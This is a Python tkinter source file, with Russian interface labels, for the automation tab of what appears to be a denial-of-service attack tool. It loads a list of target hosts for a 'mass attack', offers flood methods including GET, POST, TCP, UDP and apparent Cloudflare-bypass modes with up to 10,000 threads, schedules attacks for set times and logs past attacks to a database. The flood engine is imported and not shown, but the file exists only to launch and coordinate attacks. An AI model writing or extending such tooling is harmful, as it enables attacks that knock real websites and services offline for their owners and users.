import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading, time, sqlite3, os
from datetime import datetime
from engine.scheduler import AttackScheduler

HISTORY_DB = "attack_history.db"

class AutoTab:
    def __init__(self, notebook, app):
        self.app = app
        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text="⏰ Автоматизация")
        self.scheduler = AttackScheduler(log_func=self._log)
        self._build_ui()

    def _build_ui(self):
        left = ttk.Frame(self.frame)
        left.grid(row=0, column=0, sticky='nswe', padx=10, pady=5)
        right = ttk.Frame(self.frame)
        right.grid(row=0, column=1, sticky='nswe', padx=10, pady=5)
        self.frame.columnconfigure(0, weight=1)
        self.frame.columnconfigure(1, weight=1)
        self.frame.rowconfigure(0, weight=1)

        mass_frame = ttk.LabelFrame(left, text="Массовая атака", padding=10)
        mass_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        ttk.Label(mass_frame, text="Файл со списком целей:").pack(anchor='w')
        file_frame = ttk.Frame(mass_frame)
        file_frame.pack(fill=tk.X, pady=2)
        self.targets_file_entry = ttk.Entry(file_frame, width=40)
        self.targets_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(file_frame, text="📂", command=self._select_targets_file).pack(side=tk.LEFT, padx=5)
        if hasattr(self.app.root, 'drop_target_register'):
            self.targets_file_entry.drop_target_register('*')
            self.targets_file_entry.dnd_bind('<<Drop>>', self._on_drop_file)

        self.mass_method_var = tk.StringVar(value="CFBUAM")
        ttk.Label(mass_frame, text="Метод:").pack(anchor='w')
        ttk.Combobox(mass_frame, textvariable=self.mass_method_var,
                     values=["GET","POST","CFB","CFBUAM","BOT","TCP","UDP"], state='readonly', width=15).pack(anchor='w')
        ttk.Label(mass_frame, text="Потоки:").pack(anchor='w')
        self.mass_threads_var = tk.IntVar(value=100)
        ttk.Spinbox(mass_frame, from_=10, to=10000, increment=10, textvariable=self.mass_threads_var, width=8).pack(anchor='w')
        ttk.Button(mass_frame, text="🚀 Запустить массовую атаку", command=self._start_mass_attack).pack(pady=10)

        sched_frame = ttk.LabelFrame(left, text="Расписание", padding=10)
        sched_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        ttk.Label(sched_frame, text="Время (HH:MM):").pack(anchor='w')
        self.sched_time_entry = ttk.Entry(sched_frame, width=10)
        self.sched_time_entry.insert(0, "14:00")
        self.sched_time_entry.pack(anchor='w')
        ttk.Label(sched_frame, text="Цель:").pack(anchor='w')
        self.sched_target_entry = ttk.Entry(sched_frame, width=40)
        self.sched_target_entry.pack(anchor='w')
        ttk.Label(sched_frame, text="Метод:").pack(anchor='w')
        self.sched_method_var = tk.StringVar(value="CFBUAM")
        ttk.Combobox(sched_frame, textvariable=self.sched_method_var,
                     values=["GET","POST","CFB","CFBUAM","BOT","TCP","UDP"], state='readonly', width=15).pack(anchor='w')
        ttk.Label(sched_frame, text="Потоки:").pack(anchor='w')
        self.sched_threads_var = tk.IntVar(value=100)
        ttk.Spinbox(sched_frame, from_=10, to=10000, increment=10, textvariable=self.sched_threads_var, width=8).pack(anchor='w')
        ttk.Button(sched_frame, text="🕒 Запланировать", command=self._schedule_attack).pack(pady=5)

        limit_frame = ttk.LabelFrame(left, text="Лимиты", padding=10)
        limit_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        ttk.Label(limit_frame, text="Макс. время (сек):").pack(anchor='w')
        self.time_limit_entry = ttk.Entry(limit_frame, width=10)
        self.time_limit_entry.insert(0, "0")
        self.time_limit_entry.pack(anchor='w')
        ttk.Label(limit_frame, text="Макс. запросов:").pack(anchor='w')
        self.req_limit_entry = ttk.Entry(limit_frame, width=10)
        self.req_limit_entry.insert(0, "0")
        self.req_limit_entry.pack(anchor='w')

        hist_frame = ttk.LabelFrame(right, text="История атак", padding=10)
        hist_frame.pack(fill=tk.BOTH, expand=True)
        columns = ('id','target','method','threads','start_time','total')
        self.hist_tree = ttk.Treeview(hist_frame, columns=columns, show='headings', height=15)
        self.hist_tree.heading('id', text='ID')
        self.hist_tree.column('id', width=30)
        self.hist_tree.heading('target', text='Цель')
        self.hist_tree.column('target', width=150)
        self.hist_tree.heading('method', text='Метод')
        self.hist_tree.column('method', width=70)
        self.hist_tree.heading('threads', text='Потоки')
        self.hist_tree.column('threads', width=60)
        self.hist_tree.heading('start_time', text='Время')
        self.hist_tree.column('start_time', width=140)
        self.hist_tree.heading('total', text='Запросов')
        self.hist_tree.column('total', width=80)
        self.hist_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        scrollbar = ttk.Scrollbar(hist_frame, orient=tk.VERTICAL, command=self.hist_tree.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_tree.configure(yscrollcommand=scrollbar.set)
        ttk.Button(right, text="🔄 Обновить историю", command=self._refresh_history).pack(pady=5)

    def _select_targets_file(self):
        f = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if f:
            self.targets_file_entry.delete(0, tk.END)
            self.targets_file_entry.insert(0, f)

    def _on_drop_file(self, event):
        files = self.app.root.tk.splitlist(event.data)
        if files:
            self.targets_file_entry.delete(0, tk.END)
            self.targets_file_entry.insert(0, files[0])

    def _start_mass_attack(self):
        filepath = self.targets_file_entry.get().strip()
        if not os.path.isfile(filepath):
            messagebox.showerror("Ошибка", "Выберите файл с целями")
            return
        with open(filepath) as f:
            targets = [line.strip() for line in f if line.strip()]
        if not targets:
            messagebox.showerror("Ошибка", "Файл пуст")
            return
        method = self.mass_method_var.get()
        threads = self.mass_threads_var.get()
        threading.Thread(target=self._run_mass, args=(targets, method, threads), daemon=True).start()

    def _run_mass(self, targets, method, threads):
        attack_tab = self.app.attack_tab
        for idx, target in enumerate(targets):
            if not attack_tab.attack_active:
                self.app.root.after(0, lambda t=target: attack_tab.target_entry.delete(0, tk.END))
                self.app.root.after(0, lambda t=target: attack_tab.target_entry.insert(0, t))
                self.app.root.after(0, lambda: attack_tab.method_var.set(method))
                self.app.root.after(0, lambda: attack_tab.threads_var.set(threads))
                self.app.root.after(0, attack_tab._start_attack)
            while attack_tab.attack_active:
                time.sleep(1)
            time.sleep(2)
        messagebox.showinfo("Массовая атака", "Все цели обработаны")

    def _schedule_attack(self):
        time_str = self.sched_time_entry.get().strip()
        target = self.sched_target_entry.get().strip()
        method = self.sched_method_var.get()
        threads = self.sched_threads_var.get()
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        attack_tab = self.app.attack_tab
        def launch():
            attack_tab.target_entry.delete(0, tk.END)
            attack_tab.target_entry.insert(0, target)
            attack_tab.method_var.set(method)
            attack_tab.threads_var.set(threads)
            attack_tab._start_attack()
        self.scheduler.schedule_at(time_str, target, method, threads, launch)

    def _log(self, msg):
        print(msg)

    def _refresh_history(self):
        self.hist_tree.delete(*self.hist_tree.get_children())
        if os.path.exists(HISTORY_DB):
            conn = sqlite3.connect(HISTORY_DB)
            c = conn.cursor()
            c.execute("SELECT id, target, method, threads, start_time, total_requests FROM attacks ORDER BY id DESC LIMIT 200")
            for row in c.fetchall():
                self.hist_tree.insert('', tk.END, values=row)
            conn.close()